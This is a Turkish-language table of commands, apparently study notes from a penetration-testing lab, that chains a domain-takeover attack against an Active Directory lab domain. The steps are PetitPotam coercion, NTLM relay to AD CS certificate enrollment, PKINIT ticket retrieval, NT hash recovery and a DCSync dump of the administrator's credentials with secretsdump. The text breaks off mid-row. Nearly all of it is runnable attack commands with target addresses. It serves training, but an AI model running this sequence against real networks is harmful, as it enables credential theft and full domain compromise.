<table>
  <thead>
    <tr>
      <th>Komut</th>
      <th>Açıklama</th>
      <th>Kullanıcı</th>
      <th>Hedef</th>
      <th>Notlar</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>git clone [https://github.com/topotam/PetitPotam.git](https://github.com/topotam/PetitPotam.git)</td>
      <td>PetitPotam exploit kodunu indir</td>
      <td>Linux Kullanıcı</td>
      <td>-</td>
      <td>Git kullanılarak yapılır.</td>
    </tr>
    <tr>
      <td>python3 PetitPotam.py 172.16.5.225 172.16.5.5</td>
      <td>PetitPotam exploit kodunu çalıştır</td>
      <td>Linux Kullanıcı</td>
      <td>Hedef (Domain Controller)</td>
      <td>Hedef IP adresleri belirtilir.</td>
    </tr>
    <tr>
      <td>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</td>
      <td>NTLM relay oluşturmak için Impacket aracı</td>
      <td>Linux Kullanıcı</td>
      <td>Hedef (CA Sunucu)</td>
      <td>Sunucu sertifika kayıt URL'si belirtilir.</td>
    </tr>
    <tr>
      <td>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache</td>
      <td>TGT bileti almak için Impacket aracı</td>
      <td>Linux Kullanıcı</td>
      <td>Domain Controller</td>
      <td>Base64 sertifika ve ccache dosyası oluşturulur.</td>
    </tr>
    <tr>
      <td>klist</td>
      <td>Ccache dosyasının içeriğini görüntüle</td>
      <td>Linux Kullanıcı</td>
      <td>-</td>
      <td>Kerberos bilet bilgilerini gösterir.</td>
    </tr>
    <tr>
      <td>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</td>
      <td>NTLM hash değerleri almak</td>
      <td>Linux Kullanıcı</td>
      <td>Domain Controller</td>
      <td>TGS istekleri gönderilir ve hash değerleri alınır.</td>
    </tr>
    <tr>
      <td>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</td>
      <td>NTLM hash değerlerini NTDS.dit dosyasından çıkarmak</td>
      <td>Linux Kullanıcı</td>
      <td>Domain Controller</td>
      <td>DCSync saldırısı ve TGT bileti kullanılır.</td>
    </tr>
    <tr>
      <td>secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</td>
      <td>NTL
